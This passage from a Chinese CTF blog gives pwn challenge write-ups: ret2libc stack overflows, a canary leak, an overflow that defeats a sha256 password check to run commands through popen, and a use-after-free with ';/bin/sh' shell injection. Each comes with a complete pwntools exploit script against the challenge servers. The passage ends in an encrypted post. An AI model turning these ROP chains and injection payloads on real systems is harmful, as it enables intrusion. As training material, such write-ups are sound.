class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//a1栈空间大小为0x40，然后就是rbp、rsp</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201208055615.png" alt="20201208055615"><br>
可以看出存在明显的栈溢出，程序内也没有其他特别的sys函数和/bin/sh字符串，所以大概的思路是先查到libc版本，然后构造出system(/bin/sh)</p>
<p>得到exp：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">36759</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./b2&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./b2&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0400763</span></span><br><span class="line">main = <span class="number">0x40068E</span></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">leak = <span class="string">&quot;a&quot;</span>*<span class="number">0x40</span> + <span class="string">&quot;a&quot;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main) </span><br><span class="line">leak = leak.ljust(<span class="number">200</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.send(leak)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))	<span class="comment">#!!!p.recv() will contain a &quot;0a&quot;(\n)</span></span><br><span class="line"></span><br><span class="line">base = puts_addr - <span class="number">0x06f690</span></span><br><span class="line">sys = base + <span class="number">0x045390</span></span><br><span class="line">binsh = base + 	<span class="number">0x18cd57</span></span><br><span class="line">payload = <span class="string">&quot;1&quot;</span>*<span class="number">0x40</span> + <span class="string">&quot;1&quot;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(binsh) + p64(sys) </span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>
<p>这题主要是recv puts地址的时候要注意，数据是否截取多了/少了，因为会影响计算别的函数/字符串。<br>
还有就是send和sendline和sendlineafter；recv和recvuntil对程序、执行exp的影响…</p>
<h2 id="pwn1">pwn1</h2>
<p>这题好迷…本地打通，远程打不通；远程打通，本地打不通（换过libc）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">43763</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./babystack&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)# local</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>) <span class="comment">#remote</span></span><br><span class="line">stack = <span class="string">&quot;a&quot;</span>*<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(stack)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"></span><br><span class="line">init = <span class="number">0x00400908</span></span><br><span class="line">pop_rdi = <span class="number">0x0400a93</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">leak_addr = stack + p64(canary) + <span class="string">&quot;1&quot;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(init)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(leak_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)<span class="comment">#????	&amp; rjust||ljust</span></span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = 	<span class="number">0x045390</span></span><br><span class="line">binsh_addr = 	<span class="number">0x18cd57</span></span><br><span class="line">offset = puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system = offset + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = offset + binsh_addr</span><br><span class="line"></span><br><span class="line">payload2 = stack + p64(canary) + <span class="string">&quot;1&quot;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(binsh) + p64(system) + p64(init)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>就是一个 泄露canary、libc版本的过程。前几天就是这题和上一题，因为sendline/send/sendlineafter之类的问题把我整的怀疑人生…<br>
不想评价</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmh4ZG4vcC8xMjUzMDk0NS5odG1s">https://www.cnblogs.com/bhxdn/p/12530945.html<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="Recho">Recho</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC84YmViOTBiMjQ5ZDY=">https://www.jianshu.com/p/8beb90b249d6<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY291bnRmYXRjb2RlL3AvMTIzMjY4MDcuaHRtbA==">https://www.cnblogs.com/countfatcode/p/12326807.html<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYS9hcnRpY2xlL2RldGFpbHMvMTAyOTkyODg3">https://blog.csdn.net/seaaseesa/article/details/102992887<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="secret-file">secret_file</h2>
<p>运行一下：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201213143540.png" alt="20201213143540"></p>
<p>checksec：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201213142548.png" alt="20201213142548"><br>
x86-64的程序，所有保护都打开了哎…</p>
<p>拖入ida看主函数伪代码如下：(部分函数名经过修饰，并添加注释)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// er12</span></span><br><span class="line">  FILE *v9; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+0h] [rbp-308h]</span></span><br><span class="line">  <span class="keyword">char</span> *lineptr; <span class="comment">// [rsp+8h] [rbp-300h]</span></span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+10h] [rbp-2F8h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+110h] [rbp-1F8h] 执行的命令</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+12Bh] [rbp-1DDh] dest的sha256</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+16Ch] [rbp-19Ch] 参与sha256变换</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+18Ch] [rbp-17Ch] 与v15比较</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+1CCh] [rbp-13Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+1D0h] [rbp-138h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v20; <span class="comment">// [rsp+2D8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v20 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_E60((<span class="keyword">char</span> *)&amp;dest);                       <span class="comment">// 填充v14和v15</span></span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  lineptr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( getline(&amp;lineptr, (<span class="keyword">size_t</span> *)&amp;v11, <span class="built_in">stdin</span>) == <span class="number">-1</span> )<span class="comment">// 输入，没有限制，回车结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="built_in">strrchr</span>(lineptr, <span class="string">&#x27;\n&#x27;</span>);                  <span class="comment">// 输入判空</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  *v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = &amp;v16;</span><br><span class="line">  v5 = &amp;v17;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;dest, lineptr);               <span class="comment">// 辨识度极高的vul_func</span></span><br><span class="line">  sha256_func((__int64)&amp;dest, &amp;v16, <span class="number">0x100</span>u);    <span class="comment">// v16==sha变换后的dest（0x100）</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (<span class="keyword">unsigned</span> __int8)*v4;</span><br><span class="line">    v7 = v5;</span><br><span class="line">    v5 += <span class="number">2</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="built_in">snprintf</span>(v7, <span class="number">3uLL</span>, <span class="string">&quot;%02x&quot;</span>, v6);             <span class="comment">// 最终目的：把v17填充为hex的v16</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != &amp;v18 );</span><br><span class="line">  v8 = <span class="built_in">strcmp</span>(&amp;v15, &amp;v17);                      <span class="comment">// 比较v15和v17，如果不同就报错</span></span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong password!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = popen(&amp;v14, <span class="string">&quot;r&quot;</span>);                        <span class="comment">// 把命令传到binsh执行</span></span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( fgets(&amp;s, <span class="number">256</span>, v9) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">  fclose(v9);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>剩下两个子函数不表，功能写在注释里了程序很简短，其中可以马上注意到很熟悉的危险函数strcpy()，再一看发现两个不是很熟悉的函数：getline和popen</p>
<ul>
<li>getline(char **lineptr, size_t *n, FILE *stream):将输入的字符串放入lineptr指向的空间，（如果为NULL则由系统malloc），n:如果是malloc出的则为0，stream：终止符（？）<br>
输入结束的方式为1. 读取字符数达到n，2.遇到函数终止符（\n），3.断开输入</li>
</ul>
<p>可以看到，这里的getline也是一个没有限制输入的危险函数</p>
<ul>
<li>popen：将命令传入/bin/sh中由shell执行，分为输入和输出(w和r)</li>
</ul>
<p>所以我们要做的就是让popen执行get flag 的命令。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201213144954.png" alt="20201213144954"><br>
那么首先就要满足这个条件。再一看，发现v17的来源是(hex)v16，v16是经过sha256变换的des。所以想get shell只需要v15==v16<br>
一看栈中变量的分布，发现它们都可以被覆盖呀！！！</p>
<p>所以exp就出来了：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>, <span class="number">52529</span>)</span><br><span class="line"></span><br><span class="line">v15 = hashlib.sha256(<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p1 = &quot;a&quot;*0x100 + &quot;ls;&quot;.ljust(0x1b, ) + v15 </span></span><br><span class="line">p1 = <span class="string">&quot;a&quot;</span>*<span class="number">0x100</span> + <span class="string">&quot;cat flag.txt;&quot;</span>.ljust(<span class="number">0x1b</span>, ) + v15</span><br><span class="line"><span class="comment">#dest + cmd + sha256</span></span><br><span class="line"></span><br><span class="line">p.sendline(p1)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br></pre></td></tr></table></figure>
<p>分两次进行，一次查看目录下的文件，第二次打开.txt文件</p>
<p>over</p>
<h2 id="time-formatter">time_formatter</h2>
<p>接触到的第一个堆漏洞题</p>
<p>首先checksec：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec 5</span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/5&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<blockquote>
<p>（开启了FORTIFY_SOURCE对格式化字符串有两个影响：<br>
1.包含%n的格式化字符串不能位于程序内存中的可写地址。<br>
2.当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。）</p>
</blockquote>
<p>运行程序&amp;ida-f5：<br>
主函数是一个选择菜单，修改函数名后如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)menu(v4) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">          v5 = set_time_format(v4, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">          v5 = set_time(v4, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">          v5 = set_time_zone();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">          v5 = print_time(v4, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">          v5 = exit_program(v4, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中1和3两个选项对应的函数用到了动态分配的内存，函数2把输入的值放到了bss段</span></span><br><span class="line"><span class="comment">//不同的是函数1对输入进行了判断，函数2没有判断：</span></span><br><span class="line"></span><br><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_400CB5</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> accept; <span class="comment">// [rsp+5h] [rbp-43h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;accept, <span class="string">&quot;%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# &quot;</span>);</span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strspn</span>(s, &amp;accept) == <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//目前还不知道这个判断有什么作用</span></span><br></pre></td></tr></table></figure>
<p>继续往函数4和5看下去</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">print_time</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> command; <span class="comment">// [rsp+8h] [rbp-810h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+808h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(&amp;command, <span class="number">2048LL</span>, <span class="number">1LL</span>, <span class="number">2048LL</span>, <span class="string">&quot;/bin/date -d @%d +&#x27;%s&#x27;&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_602120, ptr, a3);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Your formatted time is: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( getenv(<span class="string">&quot;DEBUG&quot;</span>) )</span><br><span class="line">      __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1LL</span>, <span class="string">&quot;Running command: %s\n&quot;</span>, &amp;command);</span><br><span class="line">    setenv(<span class="string">&quot;TZ&quot;</span>, value, <span class="number">1</span>);</span><br><span class="line">    system(&amp;command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You haven&#x27;t specified a format!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">`/bin/date -d @%d +&#x27;%s&#x27;`是一个shell注入。</span></span><br><span class="line"><span class="comment">在命令行中，多个命令可以用分号隔开，执行时会依次运行。我们需要把它构造成：“/bin/data -d @0 + &quot;;/bin/sh&quot;”</span></span><br><span class="line"><span class="comment">但是由于传入的format在输入时就被限制了，所以不能直接通过format就让它执行我们想要的操作</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">exit_program</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  free_0(ptr);</span><br><span class="line">  free_0(value);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Are you sure you want to exit (y/N)? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (s &amp; <span class="number">0xDF</span>) == <span class="number">89</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;OK, exiting.&quot;</span>);</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里，如果执行到函数5，会先释放format和time_zone的内存，然后再询问是否退出。</span></span><br><span class="line"><span class="comment">//但并没有在free之后立刻改变指针指向的位置，造成了uaf漏洞</span></span><br></pre></td></tr></table></figure>
<p>所以大概的思路就有了：</p>
<ol>
<li>先产生一个存放format的空间然后释放，释放后指针F依旧指向这块内存，这块小空间被放在fastbin的头部，下一次分配内存时如果大小合适将首先将它分配出去</li>
<li>进入函数3，输入payload，此时payload将放入原先放置format空间</li>
<li>进入函数4，执行system(“/bin/sh”)，getshell</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">32519</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./5&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mass</span>(<span class="params">ch,data</span>):</span></span><br><span class="line">	p.sendline(ch)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(data)&gt;<span class="number">0</span>:</span><br><span class="line">		p.sendline(data)</span><br><span class="line"></span><br><span class="line">mass(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">mass(<span class="string">&quot;5&quot;</span>,<span class="string">&quot;N&quot;</span>)</span><br><span class="line">mass(<span class="string">&quot;3&quot;</span>,<span class="string">&#x27;\&#x27;;/bin/sh\&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">mass(<span class="string">&quot;4&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>不知道怎么描述的脚本，用来检测ip存活啥的</title>
    <url>/31550.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="9762d0b15180791e97938d6a341351179fe78b67158ab591466dda82614bfd8e">dc97505da4877f2b5128344b15c8fb973b1946dbb1fc0bbe3e70342ef13ff50d2e4e5f9362285ad087ad3162f8539f6659b4a294df83dfd9c3aa91985ec0f79405fa9eb2889db6beec60e51f2e30965bf19bfcb1ce05f387e64d9187c027d378bdd9e0936118a510d89d2fe86e0ca3a26ab5fe00d4bfc5749129240f98d2a9e731c689820163b5c28ad62468fcc6413558dbc4c2d0cf7aba4b614b19ba0206e81e42316390c63e84ea31ab2b5f1b0143eadb1890e452266a721b49f81cdbdc5a3705a2a8b2a7a766c38f8ecf603fac97a36b2515efb7fffc0aacdd55c5379ca2133e9777e1bce407a678d706ead5511a8000044eb67a1bc8037a4b55d964b5f78021e79f5b4cb1a6f2b764594e85c9f3f2216bfbc1996d174bf554c1346f071866c981700d23ad1e3bc7d7428537775b58c9a2a2d4b45ad254132b33dee558e8aff42c3b99d055233aed417c9fba1cd955fa04c46deffcfc209b07917f004a808bed1437604a293ac76e5187ceaaed80d5198765e030b4094b8be1192419d80c23aa46d7131548a01a6c0205c2079118ff902db9ac2c564e42623adac19a5432ecc347f485fb5e9e2c0a6f4092450b870649869ca1a977aec239e8df36966cfd9d3c1f6616fbd4681fd4efe84bf665a526072d1673fad3d348362f310c504fecd9b0b5330213ef2c3a7272653da666f2790488e161573c2c2afa494370beeeb5ae92a8e31761e7d3c5a3b20c09f7feb2ee7c95ccbe94c8e315d28bf0636df70f5f563c95c2b676b287f10ec84287ca4733ca925013231a0b9b2f14ecf84ddfebc30e785be9dd8e05396f562fae0ef0aec8a76878cd8d56069952c75c122268206aca5c794aaeec2ae28873fd07002c257367cc05b569180c2b41965feed9b48fae0cc44f15aa3274679d73e74ea9e19d80f6fb03406181f1f68099d8fdfca1904b4269512e92f5e72e8f4cdcef79ae8ecffe3cb1e5b019873782731c66f3ce03d4e2da038bf3fbe04db753bb694b9381ed6ba9b323f9b3ec44f5c7c3772af568d223b16a91ac805d7e05c6acf9605cf1af560048457cc0e0047eb66c5183d93e5c288abe17ace4f420c2e2af2d5a321a8799193a6e2e084ddc40fa8af9e89b4166f90c27e37ce1da85ba7b965713edb7e1527345a22f2ed77eb082fdfdc0f1854cb03826b71a2e8e2a8a5f6d6580a7930711f55b8f2b7c40cd4a99f88f570932eb114c80214fd3ebbdab99001ec2a2aa5f97fbec2b6c6789b388e934580d607ee8985227743e1f3f023de3e4c2b33a4633a357d8a92188cb672e5ebed4ccd1da8276345e66cba55d614feca98c08abbac049e0c5e9eb9692a5ecf21519c4c3f0a42bc986dd9b4a0dfd82d89d5fc0842276fca91ebfefc3b6c32425fc15d618425472b7c8a0eee2e918ceffc2285e8b8fdb12ca702b1e3eba1ca81df68aaed2edfa7904b50beb2c5cc513168ca99eeaf6566f0864280ab7417ccf4025595983894b4e407ce8c0bd2840dccf0d458a6a93c25abd4313fb9bb1fd5ca900edaac93358749770b9c8abeeb060757129039ae3552af89040fe2edf3b4eefe52dc938830af1a0d0923d8e73b00262144871d0247cd4c706c46301dffce44e5a240aecca516638d22baaeb8e22a214aa579c01bcbb3a6b9e25830e1c35bd24e71736ad6f326d8b69a3e400d52ab27532c64616c3dbe2ec57072f29d22eba1dc16c41ad35a507536007454d0f6f3cddcfdaecca25f090a7234ab397468f5cfce8d555be3f186c821c0da32a22ee72f493b62916b8f8db066960deeb6d37421e3bd0f3465d2a10bb0dc33868c27699a358b38e3af3bcb1fc426b4a96f569d556e050dc4c6abedf9a3b8aef1a14a153d0777a5e33635d414f61bcb00619cc81dd0d3adc969b89d1b8aafe75a8fdf2406bd302cc1eb7d593f4b330ad4d38e49e618dc3c99f98ec4264004cd19248b9f3f90094bb5caa7e936d3e99aee223000c6099db9b8cd388d126e6a6a8195e6c75c88d670af16aa32798c7237d2cfa4aff99eab469f289a4c5fdb525ff4eeb095a03258ee22cca9c5bbb276cd56eb86c3d658db8cc515ff1e81b15532f7e8183ebb3528fab6550895d562f66a1768b33093747d0a40513d33d6ed6fc201f3cd8727226ae9ec95af594aac883e609b712bb9517bba6bf45f0235da2df065b1ba81c087ae7a4e2f95fe84871b2e16531170fb0ed547130f526c9881ac74eab721ebc2d137ef5e462efce6b180dac514d63171684118904310e94171c6f5ba4d714e08565b5d64fa659960d7120fb6567ee1ed4aa44b1dbd9dbc2cc7409e0e2b4c756d94a642f47b8f98f83d68d55a117478338821d4d4c553742b2bba05b76e21ab4db60e57ed4e2624d05bcf46fbc39b00ea2393c9f0ffc082a0e3578b042f6054d76300e8fe6b3e19c1f8e59cf201e02508194a54f2fbcdd476070d841ba899ed0e3cb701175a770101c4e79ba740533fa1712ebada374068be3cf06f966f919b37dcebc79b5a0f05a0cf3b48547eb8390aea8f9686d13cf6eaa90ede6fa109fd86fed951265aafabeaf9d527e86f6cdd59c1d709c4523b40a2c5ae9ba0ac94496f0b4d9213ccbd129b90abb2187e70feee4351995fdaa1f66ed820ac7bca9431200e211018df693e3ec9a024c4f9ced32eee2c68e73e4347df3667e622c98e5720a06a7b6620929109761972478bd4b40bc04ee83d643b3f356592d604a1a0856ad8a1d0c38c87680624d3bafdff1d206fd45674eb1426b1bbb3bb7a8be47c074be42bc1e4f4d8868f4f23ac5f6f5a2e378a5bb4988273e766f0a0b9dc3ca76e967609fa84dd287d8736f4236636633564e1948c83a67a35b93c325583cfa50b2c315dc39d0dc369cdf206967168986066284a42897591c8e3156aa17ed18e5996edd71ca05047daeb971caba8838d5edc6a55768